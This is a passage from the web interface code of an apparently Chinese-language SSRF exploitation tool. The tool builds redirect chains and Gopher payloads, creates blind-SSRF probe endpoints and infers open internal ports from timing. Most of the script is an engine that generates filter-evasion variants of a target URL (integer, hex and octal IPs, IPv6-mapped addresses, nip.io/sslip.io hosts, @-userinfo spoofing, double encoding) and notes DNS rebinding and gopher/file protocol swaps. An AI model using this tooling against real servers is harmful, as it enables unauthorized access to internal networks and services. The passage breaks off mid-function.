                        <button class="btn btn-warning btn-small" onclick="toggleStatefulEditor()" style="margin-top:10px;">✏️ 高级请求编辑</button>
                        <div class="dual-editor-layout" id="statefulDualEditor" style="display:none;">
                            <div class="req-editor" id="statefulReqEditor">
                                <label style="color:var(--accent);font-size:13px;margin-bottom:14px;display:block;">📝 结构化编辑</label>
                                <label>请求方法</label>
                                <select class="req-method">
                                    <option value="GET">GET</option>
                                    <option value="POST" selected>POST</option>
                                    <option value="PUT">PUT</option>
                                    <option value="DELETE">DELETE</option>
                                    <option value="OPTIONS">OPTIONS</option>
                                    <option value="HEAD">HEAD</option>
                                    <option value="PATCH">PATCH</option>
                                </select>
                                <label>Host</label>
                                <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                                <label>路径</label>
                                <input type="text" class="req-path" placeholder="/api/v1/...">
                                <label>请求头</label>
                                <div class="req-headers" id="statefulReqHeaders"></div>
                                <button class="btn btn-ghost btn-small" onclick="addHeaderRow('statefulReqHeaders')" style="margin-bottom:10px;">+ 添加请求头</button>
                                <label>请求体</label>
                                <textarea class="req-body" placeholder="JSON或任意格式"></textarea>
                                <div style="display:flex;gap:8px;margin-top:8px;">
                                    <button class="btn btn-small" onclick="applyStatefulCustomRequest()">✅ 生成 Gopher Payload</button>
                                    <button class="btn btn-orange btn-small" onclick="syncStructuredToRaw('statefulReqEditor','statefulRawArea')">→ 同步到Raw</button>
                                </div>
                            </div>
                            <div class="raw-editor-panel" id="statefulRawPanel">
                                <div class="raw-title">
                                    <h4>🔧 Burp 风格 Raw 编辑器</h4>
                                    <button class="copy-raw-btn" onclick="copyRawEditorContent('statefulRawArea')">📋 复制</button>
                                </div>
                                <textarea class="raw-request-area" id="statefulRawArea" placeholder="粘贴或编辑原始HTTP请求..." spellcheck="false"></textarea>
                                <div class="raw-editor-btns">
                                    <button class="btn btn-orange btn-small" onclick="parseRawToStructured('statefulRawArea','statefulReqEditor')">← 解析到结构化</button>
                                    <button class="btn btn-small" onclick="rawToGopher('statefulRawArea','statefulFinalTarget')">✅ Raw → Gopher</button>
                                    <button class="btn btn-ghost btn-small" onclick="beautifyRawBody('statefulRawArea')">🎨 格式化Body</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <button class="btn" onclick="generateStatefulChain()" style="margin-top: 14px;">🔗 生成隐藏链</button>

                    <!-- 有状态链管理面板 -->
                    <div class="chain-manager">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:18px;">
                            <h3>📋 已构建的有状态链</h3>
                            <button class="manual-refresh-btn" onclick="refreshChains()">🔄 刷新</button>
                        </div>
                        <div id="chainListContainer">
                            <div class="no-chains-msg">暂无已构建的有状态链</div>
                        </div>
                    </div>
                </div>

                <!-- v2.1: 盲SSRF基准测试 Tab -->
                <div id="tab-blindbench" class="tab-content">
                    <div class="protocol-tip" style="border-left-color:var(--accent-purple);">
                        <b>🧪 盲SSRF基准测试说明：</b>盲SSRF 无回显, 需要一套<b>行为完全可控</b>的端点作为"探针"。
                        将盲SSRF payload 分别指向下方不同端点 (如 <code style="color:var(--accent-purple);">/bb/200</code> 与 <code style="color:var(--accent-purple);">/bb/500</code>),
                        观察目标服务器的外部可观测差异 —— <b>是否发起二次请求 / 是否报错 / 响应时间差 / 重试行为 / 任务状态变化</b>,
                        即可推断盲SSRF是否存在、请求是否成功、以及目标对各类响应的处理逻辑。<br>
                        <b>典型用法：</b>① 对比 200 vs 500 命中后目标的行为差异 → 判断请求是否真正发出;
                        ② 用 <code style="color:var(--accent-purple);">/bb/delay3s</code> / <code style="color:var(--accent-purple);">/bb/timeout</code> 探测目标的超时阈值;
                        ③ 编辑响应体为仿真内容 (如伪造元数据JSON) 观察目标解析行为。
                    </div>

                    <!-- 新建端点 -->
                    <div class="bypass-panel" style="border-color:rgba(188,140,255,0.3);">
                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
                            <h3 style="font-size:14px;color:var(--accent-purple);">➕ 新建基准端点</h3>
                            <button class="btn btn-cyan btn-small" onclick="bbCreateDefaults()">⚡ 补齐默认基准组</button>
                        </div>
                        <div class="bb-create-grid">
                            <div>
                                <label>端点路径</label>
                                <div class="bb-path-wrap">
                                    <span class="bb-path-prefix">/bb/</span>
                                    <input type="text" id="bbNewPath" placeholder="mycustom" style="flex:1;">
                                </div>
                            </div>
                            <div>
                                <label>状态码 (100-599)</label>
                                <input type="text" id="bbNewStatus" value="200" placeholder="200">
                            </div>
                            <div>
                                <label>响应延时 (毫秒, 0-60000)</label>
                                <input type="text" id="bbNewDelay" value="0" placeholder="0">
                            </div>
                            <div>
                                <label>Content-Type</label>
                                <select id="bbNewContentType">
                                    <option value="text/html; charset=utf-8" selected>text/html</option>
                                    <option value="application/json">application/json</option>
                                    <option value="text/plain; charset=utf-8">text/plain</option>
                                    <option value="application/xml">application/xml</option>
                                    <option value="image/jpeg">image/jpeg</option>
                                </select>
                            </div>
                        </div>
                        <div class="form-group">
                            <label>响应体 (可编辑任意内容, 支持伪造JSON/HTML等)</label>
                            <textarea id="bbNewBody" style="min-height:90px;font-family:'JetBrains Mono','Fira Code',monospace;font-size:13px;" placeholder='<html><body><h1>200 OK</h1></body></html>'></textarea>
                        </div>
                        <div class="form-group">
                            <label>自定义响应头 (可选, 每行一个 Key: Value)</label>
                            <textarea id="bbNewHeaders" style="min-height:60px;font-family:'JetBrains Mono','Fira Code',monospace;font-size:13px;" placeholder="Server: nginx/1.18.0&#10;X-Cache: HIT"></textarea>
                        </div>
                        <button class="btn" onclick="bbCreateEndpoint()">✅ 创建端点</button>
                    </div>

                    <!-- 端点列表 -->
                    <div class="chain-manager" style="margin-top:18px;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:8px;">
                            <h3>📡 基准端点列表 (<span id="bbCount">0</span>)</h3>
                            <div style="display:flex;gap:8px;">
                                <button class="manual-refresh-btn" onclick="bbResetStats()">🔃 重置命中统计</button>
                                <button class="manual-refresh-btn" onclick="loadBlindBench()">🔄 刷新</button>
                            </div>
                        </div>
                        <div id="bbListContainer">
                            <div class="no-chains-msg">加载中...</div>
                        </div>
                    </div>
                </div>

                <div class="result-box" id="resultBox">
                    <h3 style="color:var(--accent-green);margin-bottom:10px;font-size:15px;">🎯 Payload URL:</h3>
                    <div class="payload-url" id="payloadUrl"></div>
                    <button class="copy-btn" onclick="copyPayload()">📋 复制</button>

                    <!-- v1.9: Payload 首跳 SSRF 绕过变形面板 (按原理分类 + 批量复制) -->
                    <div class="payload-bypass-box" id="payloadBypassBox" style="display:none;">
                        <div class="pb-header" onclick="togglePayloadBypass()">
                            <span class="pb-title">🧩 首跳 SSRF 绕过变形<span class="pb-badge">按原理分类</span></span>
                            <span class="pb-toggle-hint" id="pbToggleHint">收起 ▲</span>
                        </div>
                        <div class="pb-body" id="pbBody">
                            <div class="pb-target" id="pbTargetInfo"></div>
                            <div class="pb-batch-row" id="pbBatchRow" style="display:none;">
                                <label class="pb-sel-all"><input type="checkbox" id="pbSelectAll" onchange="pbToggleSelectAll(this.checked)"> 全选</label>
                                <button class="btn btn-cyan btn-small" style="padding:5px 10px;font-size:11px;" onclick="pbInvertSelection()">🔄 反选</button>
                                <span class="pb-sep">|</span>
                                <label class="pb-fmt-label" for="pbCopyFormat">格式</label>
                                <select id="pbCopyFormat" class="pb-format-select">
                                    <option value="url">仅URL · 每行一个</option>
                                    <option value="labeled">标签: URL</option>
                                    <option value="grouped">按分组分段</option>
                                </select>
                                <button class="btn btn-green btn-small" onclick="pbBatchCopy(true)">📋 复制选中</button>
                                <button class="btn btn-cyan btn-small" onclick="pbBatchCopy(false)">📋 复制全部</button>
                                <span class="pb-sel-count" id="pbSelCount">已选 0 / 0</span>
                            </div>
                            <div class="pb-domain-row" id="pbDomainRow" style="display:none;">
                                <label>🌐 @欺骗伪装域名</label>
                                <input type="text" id="pbFakeDomain" value="www.baidu.com" placeholder="www.baidu.com">
                                <button class="btn btn-cyan btn-small" onclick="autoGeneratePayloadBypass(document.getElementById('payloadUrl').textContent)">🔄 重新生成</button>
                            </div>
                            <div class="pb-variant-list" id="pbVariantList"></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- 右侧：日志 + 时间轴 面板 -->
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; gap:10px; flex-wrap:wrap;">
                    <div class="nav-tabs" style="margin-bottom:0; flex:1; min-width:220px;">
                        <button class="nav-tab active" data-logtab="logs" style="flex:1;">📡 请求日志</button>
                        <button class="nav-tab" data-logtab="timeline" style="flex:1;">📈 命中时间轴</button>
                    </div>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-danger" onclick="clearAllLogs()">清空</button>
                        <button class="manual-refresh-btn" id="manualRefreshBtn">刷新</button>
                    </div>
                </div>

                <!-- 请求日志子页 -->
                <div id="logtab-logs" class="logtab-content active">
                    <div class="logs-container" id="logsContainer">
                        <div style="text-align:center; padding:50px; color:var(--text-muted); font-size: 15px;">等待流量...</div>
                    </div>
                </div>

                <!-- 命中时间轴子页 -->
                <div id="logtab-timeline" class="logtab-content">
                    <div class="protocol-tip tip-orange" style="margin-bottom:14px;">
                        <b>📈 端口开放推断说明：</b>配合「有状态链 → 批量队列」使用。以<b>稳定节奏</b>触发SSRF (如 Burp Intruder 匀速发包)，
                        相邻命中间隔<span style="color:var(--accent-green);font-weight:700;">显著变慢</span> = 连接成功等待响应/超时 → <b style="color:var(--accent-green);">疑似开放</b>；
                        间隔很快 = RST 秒拒 → <b>疑似关闭</b>。阈值为中位数×2 (可手动覆盖)，启发式结果仅供参考。
                    </div>
                    <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;">
                        <select id="timelineChainSelect" style="flex:1;min-width:180px;padding:10px 14px;font-size:13px;">
                            <option value="">🌐 全部重定向流量</option>
                        </select>
                        <input type="text" id="timelineThreshold" placeholder="阈值ms (留空自动)" style="width:160px;padding:10px 14px;font-size:13px;">
                        <button class="btn btn-small" onclick="refreshTimeline()">🔍 分析</button>
                    </div>
                    <div id="timelineSummary" style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;"></div>
                    <div class="logs-container" id="timelineContainer" style="max-height:560px;">
                        <div style="text-align:center;padding:40px;color:var(--text-muted);">触发SSRF命中后，点击「分析」查看时间轴</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const POCS = {{ poc_json|safe }};
        const QUEUE_PRESETS = {{ queue_presets_json|safe }};
        const BASE_URL = window.location.origin;
        // v2.0: 控制台与管理 API 的随机路径前缀 (后端注入, 每次启动变化)
        const CONSOLE_PREFIX = '{{ console_path }}';
        let stepCount = 0;
        let statefulStepCount = 0;
        let hiddenLogIds = new Set();

        function escapeHtml(text) {
            if (!text) return '';
            return text.replace(/[&<>"']/g, function(m) {
                const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                return map[m];
            });
        }

        function getStatusCodeOptions(selectedCode = '302') {
            const codes = [
                {code: '300', desc: 'Multiple Choices'},
                {code: '301', desc: 'Moved Permanently'},
                {code: '302', desc: 'Found (改GET)'},
                {code: '303', desc: 'See Other (强制GET)'},
                {code: '307', desc: 'Temporary Redirect (保留方法)'},
                {code: '308', desc: 'Permanent Redirect (保留方法)'}
            ];
            return codes.map(c => `<option value="${c.code}" ${c.code === selectedCode ? 'selected' : ''}>${c.code} - ${c.desc}</option>`).join('');
        }

        document.getElementById('statusCode').innerHTML = getStatusCodeOptions('302');

        // 基础跳转: 降级模式切换时禁用响应码选择
        function onBasicModeChange() {
            const m = document.getElementById('redirectMode').value;
            const sc = document.getElementById('statusCode');
            sc.disabled = (m !== '30x');
            sc.style.opacity = (m !== '30x') ? '0.4' : '1';
        }

        // HEAD Bypass toggle
        function toggleHeadBypassConfig(section) {
            const checkbox = document.getElementById(`hb${capitalize(section)}Check`);
            const config = document.getElementById(`hb${capitalize(section)}Config`);
            if (config) {
                config.classList.toggle('show', checkbox.checked);
            }
        }
        function capitalize(s) { return s.charAt(0).toUpperCase() + s.slice(1); }

        // ========== SSRF 绕过助手 ==========
        function toggleBypassHelper() {
            const e = document.getElementById('bypassPanel');
            e.style.display = e.style.display === 'none' ? 'block' : 'none';
        }

        function fillBypassTarget(el) {
            const url = el.dataset.url;
            document.getElementById('targetUrl').value = url;
            alert('✅ 已填入目标URL:\\n' + url);
        }

        // ========== v1.8: 统一 SSRF 绕过分类引擎 (按原理分组) ==========
        // 尝试将十进制/十六进制整型 host 还原为点分 IPv4, 使已变形 URL 可再次生成全量变形
        function pbNormalizeHost(host) {
            const m = host.match(/^(0x[0-9a-fA-F]{1,8}|[1-9]\\d{0,9}|\\d)$/);
            if (!m) return host;
            const num = /^0x/i.test(host) ? parseInt(host.slice(2), 16) : parseInt(host, 10);
            if (isNaN(num) || num < 0 || num > 4294967295) return host;
            return [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
        }

        // 对 scheme://authority rest 生成按绕过原理分组的变体集合
        // 返回 { groups: [{id, icon, name, principle, variants: [{label, url, display, note}]}], notes: [...] }
        function buildBypassGroups(scheme, authority, rest, fakeDomain) {
            const hp = pbParseHostPort(authority);
            if (!hp) return { groups: [], notes: [] };
            let host = hp.host;
            const port = hp.port;
            const notes = [];
            const isLocalhost = (host.toLowerCase() === 'localhost');
            const isIntegerForm = /^(0x[0-9a-fA-F]{1,8}|[1-9]\\d{0,9}|\\d)$/.test(host);
            if (isLocalhost) {
                host = '127.0.0.1';
                notes.push('ℹ️ 检测到 localhost, 已按 127.0.0.1 生成全量变形。');
            } else if (isIntegerForm) {
                const before = host;
                host = pbNormalizeHost(host);
                if (host !== before) notes.push('ℹ️ 检测到整型形式 (' + before + '), 已自动还原为点分 IPv4: ' + host);
            }
            const parts = host.split('.');
            const isIp = parts.length === 4 && parts.every(p => /^\\d{1,3}$/.test(p) && +p <= 255);
            const fd = fakeDomain || 'www.baidu.com';
            const ps = port ? ':' + port : '';
            const mk = v => scheme + '://' + v + ps + rest;

            // 域名目标: 仅 URL 解析差异类 (@欺骗) 可用
            if (!isIp) {
                notes.push('⚠️ 主机为域名 (非IPv4), 进制/IPv6/DNS 类变形不可用, 仅生成 @欺骗 变体。');
                return {
                    notes: notes,
                    groups: [{
                        id: 'parser', icon: '🎭', name: 'URL 解析差异',
                        principle: '利用校验器与请求库的 URL 解析实现差异',
                        variants: [{
                            label: '@用户信息欺骗',
                            url: scheme + '://' + fd + '@' + authority + rest,
                            display: fd + '@' + authority,
                            note: '校验器取 @ 前 host, 请求库取 @ 后'
                        }]
                    }]
                };
            }

            const n = parts.map(Number);
            const long = ((n[0] * 256 + n[1]) * 256 + n[2]) * 256 + n[3];
            const rest3 = (n[1] * 256 + n[2]) * 256 + n[3];
            const rest2 = n[2] * 256 + n[3];
            const encDigits = '⓪①②③④⑤⑥⑦⑧⑨';
            const enclosed = host.split('').map(ch => /\\d/.test(ch) ? encDigits[+ch] : ch).join('');
            const pctAll = host.split('').map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
            const pctDbl = host.split('').map(c => '%25' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
            const hi = (n[0] * 256 + n[1]).toString(16);
            const lo = (n[2] * 256 + n[3]).toString(16);
            const isLoop = host === '127.0.0.1';
            const BS = String.fromCharCode(92);

            const groups = [];

            // ① 进制变形 —— 绕过正则式 IPv4 黑名单
            const radix = [
                ['十进制整型', String(long), ''],
                ['十六进制整型', '0x' + long.toString(16), ''],
                ['八进制整型', '0' + long.toString(8), ''],
                ['点分十六进制', n.map(x => '0x' + x.toString(16)).join('.'), ''],
                ['点分八进制', n.map(x => '0' + x.toString(8)).join('.'), ''],
                ['混合进制', '0x' + n[0].toString(16) + '.' + rest3, ''],
                ['短格式 a.b', n[0] + '.' + rest3, ''],
                ['短格式 a.b.c', n[0] + '.' + n[1] + '.' + rest2, ''],
                ['零填充 (八进制陷阱)', parts.map(x => x.padStart(3, '0')).join('.'), '部分解析器按八进制解析'],
                ['末尾加点', host + '.', ''],
                ['圈数字', enclosed, '极少部分解析器支持'],
            ];
            if (isLoop) radix.push(['零 (Linux 本机)', '0', '仅 Linux, 解析为 127.0.0.1']);
            groups.push({
                id: 'radix', icon: '📐', name: '进制变形',
                principle: '绕过正则式 IPv4 黑名单: 校验器不认识变形格式, 但底层仍解析到同一 IP',
                variants: radix.map(v => ({ label: v[0], url: mk(v[1]), display: v[1], note: v[2] }))
            });

            // ② IPv6 变形 —— 绕过仅匹配 IPv4 格式的校验
            const v6 = [
                ['IPv6 映射', '[::ffff:' + host + ']', ''],
                ['IPv6 映射 (hex)', '[::ffff:' + hi + ':' + lo + ']', ''],
                ['IPv6 兼容', '[::' + host + ']', ''],
            ];
            if (isLoop) {
                v6.push(['IPv6 环回 (简写)', '[::1]', '']);
                v6.push(['IPv6 环回 (完整)', '[0:0:0:0:0:0:0:1]', '绕过仅匹配 [::1] 简写的黑名单']);
            }
            groups.push({
                id: 'ipv6', icon: '🌐', name: 'IPv6 变形',
                principle: '绕过仅匹配 IPv4 格式 (或仅匹配 IPv6 简写形式) 的校验',
                variants: v6.map(v => ({ label: v[0], url: mk(v[1]), display: v[1], note: v[2] }))
            });

            // ③ DNS 域名解析 —— 域名解析指向该 IP, 绕过基于 IP 的黑名单
            const dash = host.split('.').join('-');
            const portPrefix = port ? port + '-' : '';
            const dns = [
                ['nip.io', host + '.nip.io', '需公网 DNS 可达'],
                ['nip.io (端口前缀)', portPrefix + dash + '.nip.io', '端口编入域名'],
                ['sslip.io', host + '.sslip.io', '需公网 DNS 可达'],
                ['sslip.io (端口前缀)', portPrefix + dash + '.sslip.io', '端口编入域名'],
            ];
            if (isLoop) dns.push(['localtest.me', 'localtest.me', '解析到 127.0.0.1']);
            groups.push({
                id: 'dns', icon: '🔗', name: 'DNS 域名解析',
                principle: '域名解析后指向该 IP, 绕过基于 IP 的黑名单 (需目标可解析公网域名)',
                variants: dns.map(v => ({ label: v[0], url: mk(v[1]), display: v[1], note: v[2] }))
            });

            // ④ URL 解析差异 —— 利用校验器与请求库的解析实现差异
            const bsHost = host.split('.').join(BS);
            const parser = [
                ['@用户信息欺骗', scheme + '://' + fd + '@' + authority + rest, fd + '@' + authority, '校验器取 @ 前 host, 请求库取 @ 后'],
                ['多重斜杠', scheme + ':///' + authority + rest, '///' + authority, '部分解析器容忍多余斜杠'],
                ['反斜杠分隔', scheme + ':' + BS + BS + bsHost + ps + rest, bsHost, 'Windows / 部分客户端按反斜杠解析'],
                ['URL 编码 host', scheme + '://' + pctAll + ps + rest, pctAll, '部分解析器先解码再解析 host'],
                ['双重 URL 编码', scheme + '://' + pctDbl + ps + rest, pctDbl, '对抗只解码一次的 WAF'],
                ['Fragment 追加', scheme + '://' + authority + rest + '#', authority, '部分校验截断 # 后内容'],
            ];
            groups.push({
                id: 'parser', icon: '🎭', name: 'URL 解析差异',
                principle: '利用校验器与请求库的 URL 解析实现差异',
                variants: parser.map(v => ({ label: v[0], url: v[1], display: v[2], note: v[3] }))
            });

            return { groups: groups, notes: notes };
        }

        // ========== 手动绕过助手 (v1.9: 记录变体供批量复制) ==========
        let manualBypassVariants = [];

        function generateBypassVariants() {
            const ip = document.getElementById('bypassIp').value.trim();
            const port = document.getElementById('bypassPort').value.trim();
            const path = document.getElementById('bypassPath').value.trim() || '/';
            const domain = document.getElementById('bypassDomain').value.trim() || 'www.baidu.com';
            const p = path.startsWith('/') ? path : '/' + path;
            const authority = ip + (port ? ':' + port : '');
            const res = buildBypassGroups('http', authority, p, domain);
            const box = document.getElementById('bypassVariants');
            if (res.groups.length === 0) {
                box.innerHTML = '';
                manualBypassVariants = [];
                alert('❌ 无法解析主机: ' + ip);
                return;
            }
            manualBypassVariants = [];
            let html = '';
            res.groups.forEach(g => {
                html += `<div class="bypass-group-header"><span class="bypass-group-name">${g.icon} ${escapeHtml(g.name)}</span><span class="bypass-group-count">${g.variants.length}</span><span class="bypass-group-principle">${escapeHtml(g.principle)}</span></div>`;
                g.variants.forEach(v => {
                    manualBypassVariants.push(v);
                    html += `<span class="variant-chip" data-url="${escapeHtml(v.url)}" title="${escapeHtml(v.note ? v.label + ' · ' + v.note + '\\n' + v.url : v.url)}" onclick="fillBypassTarget(this)"><span class="vlabel">${escapeHtml(v.label)}</span>${escapeHtml(v.display)}</span>`;
                });
            });
            if (res.notes.length) {
                html += `<div class="pb-note" style="margin-top:12px;">${res.notes.map(escapeHtml).join('<br>')}</div>`;
            }
            box.innerHTML = html;
        }

        // 手动绕过助手: 一键复制全部变体 URL (每行一个)
        function copyAllBypassVariants() {
            if (!manualBypassVariants.length) {
                alert('⚠️ 请先点击「⚡ 生成绕过变体」再复制。');
                return;
            }
            doCopy(manualBypassVariants.map(v => v.url).join('\\n'),
                '✅ 已批量复制 ' + manualBypassVariants.length + ' 个绕过变体 URL!');
        }

        // ========== v1.7: 🎯 Payload 首跳 SSRF 绕过变形 ==========
        // 变形对象是 Payload URL 自身 (提交给目标 SSRF 点的首跳入口), 而非链内嵌目标:
        // 目标应用的过滤校验发生在提交侧, 对首跳 host 变形即可绕过;
        // 所有变形 URL 仍指向本 Redirector 服务器, 链式跳转与后端逻辑完全不变
        let pbCollapsed = false;
        let pbCurrentVariants = [];

        function togglePayloadBypass() {
            pbCollapsed = !pbCollapsed;
            document.getElementById('payloadBypassBox').classList.toggle('collapsed', pbCollapsed);
            document.getElementById('pbToggleHint').textContent = pbCollapsed ? '展开 ▼' : '收起 ▲';
        }

        // 解析 authority (host[:port]), 支持 IPv6 [..]:port 形式
        function pbParseHostPort(authority) {
            if (authority.startsWith('[')) {
                const close = authority.indexOf(']');
                if (close === -1) return null;
                return { host: authority.slice(1, close), port: authority.slice(close + 1).replace(/^:/, '') };
            }
            const idx = authority.lastIndexOf(':');
            if (idx > -1 && /^\\d+$/.test(authority.slice(idx + 1))) return { host: authority.slice(0, idx), port: authority.slice(idx + 1) };
            return { host: authority, port: '' };
        }

        function pbChainTypeName(pathname) {
            if (pathname === '/r') return '基础跳转';
            if (pathname === '/c') return '智能链';
            return '有状态链';
        }

        // ========== v1.9: 📋 变形 URL 批量复制 ==========
        function pbGetChecks() {
            return Array.from(document.querySelectorAll('.pb-variant-check'));
        }

        function pbToggleSelectAll(checked) {
            pbGetChecks().forEach(c => { c.checked = checked; });
            const all = document.getElementById('pbSelectAll');
            if (all) all.checked = checked;
            pbUpdateSelCount();
        }

        function pbInvertSelection() {
            pbGetChecks().forEach(c => { c.checked = !c.checked; });
            pbUpdateSelCount();
        }

        // 勾选/取消一个分组内的全部变体
        function pbSelectGroup(gid, checked) {
            document.querySelectorAll('.pb-variant-check[data-gid="' + gid + '"]').forEach(c => { c.checked = checked; });
            pbUpdateSelCount();
        }

        function pbUpdateSelCount() {
            const checks = pbGetChecks();
            const sel = checks.filter(c => c.checked).length;
            const cnt = document.getElementById('pbSelCount');
            if (cnt) cnt.textContent = '已选 ' + sel + ' / ' + checks.length;
            const all = document.getElementById('pbSelectAll');
            if (all) all.checked = checks.length > 0 && sel === checks.length;
        }

        // 批量复制变形 URL: selectedOnly=true 复制勾选项, false 复制全部
        // 格式: url=每行一个URL / labeled=标签: URL / grouped=按分组分段
        function pbBatchCopy(selectedOnly) {
            if (!pbCurrentVariants.length) {
                alert('⚠️ 暂无可复制的变形 URL, 请先生成 Payload。');
                return;
            }
            let items;
            if (selectedOnly) {
                const selIdx = pbGetChecks().filter(c => c.checked).map(c => parseInt(c.dataset.idx, 10));
                if (!selIdx.length) {
                    alert('⚠️ 请先勾选要复制的变形 (或直接使用「复制全部」)。');
                    return;
                }
                items = selIdx.map(i => pbCurrentVariants[i]).filter(Boolean);
            } else {
                items = pbCurrentVariants.slice();
            }
            const fmtEl = document.getElementById('pbCopyFormat');
            const fmt = (fmtEl && fmtEl.value) || 'url';
            let text;
            if (fmt === 'labeled') {
                text = items.map(v => v.label + ': ' + v.url).join('\\n');
            } else if (fmt === 'grouped') {
                const byGroup = {};
                const order = [];
                items.forEach(v => {
                    const g = v.gname || '其他';
                    if (!byGroup[g]) { byGroup[g] = []; order.push(g); }
                    byGroup[g].push(v);
                });
                text = order.map(g =>
                    '## ' + g + ' (' + byGroup[g].length + ')\\n' + byGroup[g].map(v => v.url).join('\\n')
                ).join('\\n\\n');
            } else {
                text = items.map(v => v.url).join('\\n');
            }
            doCopy(text, '✅ 已批量复制 ' + items.length + ' 个变形 URL' + (selectedOnly ? ' (选中项)' : '') + '!');
        }

        function copyPbVariant(i) {
            const v = pbCurrentVariants[i];
            if (v) doCopy(v.url, '✅ 已复制 [' + v.label + '] 首跳变形 URL!');
        }

        function applyPbVariant(i) {
            const v = pbCurrentVariants[i];
            if (!v) return;
            document.getElementById('payloadUrl').textContent = v.url;
            alert('⇪ Payload URL 已替换为 [ ' + v.label + ' ] 首跳变形\\n\\n' + v.url);
        }

        // 主入口: 对 Payload URL (首跳) 自动生成按绕过原理分类的变形供选择
        function autoGeneratePayloadBypass(payloadUrl) {
            pbCurrentVariants = [];
            const box = document.getElementById('payloadBypassBox');
            const listEl = document.getElementById('pbVariantList');
            const infoEl = document.getElementById('pbTargetInfo');
            const domainRow = document.getElementById('pbDomainRow');
            const batchRow = document.getElementById('pbBatchRow');
            if (!payloadUrl) { box.style.display = 'none'; batchRow.style.display = 'none'; return; }
            const m = payloadUrl.match(/^([a-zA-Z][a-zA-Z0-9+.\\-]*):\\/\\/([^\\/?#]+)([\\/?#].*)?$/);
            if (!m) { box.style.display = 'none'; batchRow.style.display = 'none'; return; }
            const scheme = m[1], authority = m[2], rest = m[3] || '';
            if (!pbParseHostPort(authority)) { box.style.display = 'none'; batchRow.style.display = 'none'; return; }
            const fakeDomain = (document.getElementById('pbFakeDomain').value || '').trim() || 'www.baidu.com';
            const chainType = pbChainTypeName(rest.split(/[?#]/)[0]);
            const res = buildBypassGroups(scheme, authority, rest, fakeDomain);

            // 扁平化所有变体供 复制/设为当前/批量复制 按索引操作, 同时按组渲染
            const rows = [];
            let html = '';
            res.groups.forEach(g => {
                const gname = g.icon + ' ' + g.name;
                html += `<div class="pb-group-header"><span class="pb-group-name">${g.icon} ${escapeHtml(g.name)}</span><span class="pb-group-count">${g.variants.length}</span><span class="pb-group-principle">—— ${escapeHtml(g.principle)}</span><label class="pb-group-gsel"><input type="checkbox" onchange="pbSelectGroup('${g.id}', this.checked)"> 选本组</label></div>`;
                g.variants.forEach(v => {
                    const idx = rows.length;
                    rows.push(Object.assign({}, v, { gname: gname }));
                    html += `<div class="pb-row">` +
                        `<label class="pb-check"><input type="checkbox" class="pb-variant-check" data-idx="${idx}" data-gid="${g.id}" onchange="pbUpdateSelCount()"></label>` +
                        `<span class="pb-label">${escapeHtml(v.label)}</span>` +
                        `<span class="pb-target-text" title="${escapeHtml(v.url)}">${escapeHtml(v.url)}</span>` +
                        `<div class="pb-actions">` +
                        `<button class="btn btn-cyan btn-small" onclick="copyPbVariant(${idx})">📋 复制变形URL</button>` +
                        `<button class="btn btn-warning btn-small" onclick="applyPbVariant(${idx})">⇪ 设为当前</button>` +
                        `</div>` +
                        (v.note ? `<span class="pb-row-note">⚠ ${escapeHtml(v.note)}</span>` : '') +
                        `</div>`;
                });
            });
            // 原理速查: 无法对首跳 host 自动生成的绕过思路
            html += `<div class="pb-note"><b>💡 更多绕过原理速查 (无法自动变形, 需手动结合)：</b><br>` +
                `⑤ <b>30x / 降级跳转</b> (本工具核心能力) —— 绕过"发起前校验 URL"类过滤: 让目标请求可信域名, 由本工具 30x 引流至内网<br>` +
                `⑥ <b>DNS Rebinding</b> —— 对抗"解析后校验 IP 再请求"的目标 (TOCTOU 竞态, 需自建双 A 记录 DNS)<br>` +
                `⑦ <b>协议替换</b> dict:// gopher:// file:// netdoc:// —— 绕过协议白名单薄弱点 (见内置 POC 库与 Gopher 装填)</div>`;

            pbCurrentVariants = rows;
            box.style.display = 'block';
            domainRow.style.display = rows.length ? 'flex' : 'none';
            batchRow.style.display = rows.length ? 'flex' : 'none';
            const selAll = document.getElementById('pbSelectAll');
            if (selAll) selAll.checked = false;
            const baseDisplay = scheme + '://' + authority + rest;
            let info = `<b>🎯 首跳变形基准 (${chainType}) · 共 ${rows.length} 种变形</b><br>${escapeHtml(baseDisplay)}` +
                '<br><span style="color:var(--text-muted);">所有变形 URL 均指向本 Redirector 服务器, 提交给目标 SSRF 点用于绕过其对提交 URL 的过滤校验; 链式跳转与后端逻辑完全不变。</span>';
            res.notes.forEach(n => { info += '<br><span style="color:var(--accent-yellow);">' + escapeHtml(n) + '</span>'; });
            infoEl.innerHTML = info;
            listEl.innerHTML = html || '<div class="pb-note">未生成任何变形</div>';
            pbUpdateSelCount();
        }

        let pocOptionsHtml = '<option value="" data-method="AUTO">-- 选择POC或手动输入 --</option>';
        const categories = {};
        POCS.forEach((poc) => {
            if (!categories[poc.category]) categories[poc.category] = [];
            categories[poc.category].push(poc);
        });
        for (const [cat, pocs] of Object.entries(categories)) {
            pocOptionsHtml += `<optgroup label="${cat}">`;
            pocs.forEach(p => {
                pocOptionsHtml += `<option value="${p.payload}" data-method="${p.method || 'GET'}">[${p.method}] ${p.name}</option>`;
            });
            pocOptionsHtml += `</optgroup>`;
        }

        document.getElementById('pocSelect').innerHTML = pocOptionsHtml;
        document.getElementById('pocSelect').addEventListener('change', function() {
            const opt = this.options[this.selectedIndex];
            const target = opt.value;
            if (!target) return;
            document.getElementById('targetUrl').value = target;
            const method = opt.getAttribute('data-method');
            const matchedPoc = POCS.find(p => p.payload === target);
            if (matchedPoc) {
